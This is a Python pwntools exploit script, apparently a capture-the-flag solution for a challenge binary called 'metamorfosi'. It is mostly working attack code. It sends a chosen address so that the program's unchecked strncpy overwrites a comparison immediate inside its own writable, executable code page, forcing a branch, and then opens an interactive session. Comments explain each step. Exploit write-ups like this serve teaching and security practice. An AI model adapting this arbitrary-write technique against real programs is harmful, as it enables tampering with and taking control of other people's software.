#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template metamorfosi
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('metamorfosi')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

executable_page_start = 0x400000
# This program calls
#   mprotect(executable_page_start, 1, PROT_READ | PROT_WRITE | PROT_EXEC)
# marking the page containing the test() function as both writable
# and executable. The test function has a cmp instruction comparing
# a local variable (initialized to 1) with the immediate 0. What we want to
# do is to replace the immediate value with 1, so that the branch is taken.
# With objdump we can see that the address of the immediate is
# 'immediate_addr' (see below).

immediate_addr = 0x40098c

# This program does the following operations:
#    char *dst;
#    char buf[0x1000];
#    scanf("%x", &dst);
#    ...
#    fgets(buf, 0x1000, stdin);
#    strncpy(dst, buf, strlen(buf)-1);
#    ....
#    test();

# We can send 'immediate_addr', so that the strncpy() will
# start overwriting the test() code.
io.sendline(hex(immediate_addr))
# The fgets() stops at a newline, which is inserted by sendline()
# after the three characters we pass as argument.
# The fact that strlen() is used implies that we need to add a
# terminator. The non-sense "strlen(buf)-1" impies that we need
# to add an additional arbitrary character after the '\x01',
# so that the strncpy() will copy exactly 1 character.
io.sendline('\x01' + '\xab' + '\x00')

io.interactive()

